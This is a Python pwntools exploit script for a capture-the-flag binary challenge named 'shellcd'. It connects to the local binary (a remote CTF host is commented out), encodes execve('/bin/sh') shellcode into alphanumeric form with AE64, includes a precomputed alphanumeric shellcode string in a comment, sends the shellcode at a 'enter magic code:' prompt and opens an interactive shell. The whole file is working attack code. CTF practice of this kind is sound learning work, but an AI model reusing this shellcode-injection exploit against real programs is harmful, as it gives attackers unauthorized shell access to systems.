from pwn import *

context.log_level = "debug"
context(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]


def p(s, m):
    if m == 0:
        io = process(s)
    else:
        if ":" in s:
            x = s.split(":")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        elif " " in s:
            x = s.split(" ")
            addr = x[0]
            port = int(x[1])
            io = remote(addr, port)
        else:
            error(f"{s} may be some error")
    return io


def gg():
    gdb.attach(io)
    raw_input()


s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
sl = lambda x: io.sendline(x)
rv = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rvl = lambda: io.recvline()
lg = lambda x, y: log.info(f"\x1b[01;38;5;214m {x} => {hex(y)} \x1b[0m")
ia = lambda: io.interactive()
uu32 = lambda x: u32(x.ljust(4, b"\x00"))
uu64 = lambda x: u64(x.ljust(8, b"\x00"))
l32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))


io = p("./shellcd", 0)
# io = p("game.ctf.seusus.com:50386", 1)
# shell = b"RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"
from ae64 import AE64

shell = AE64().encode(b"H\xb8/bin/sh\x00PT_1\xc0P\xb0;TZT^\x0f\x05", "rax")
# s(shell)
sa(b"enter magic code:", shell)

ia()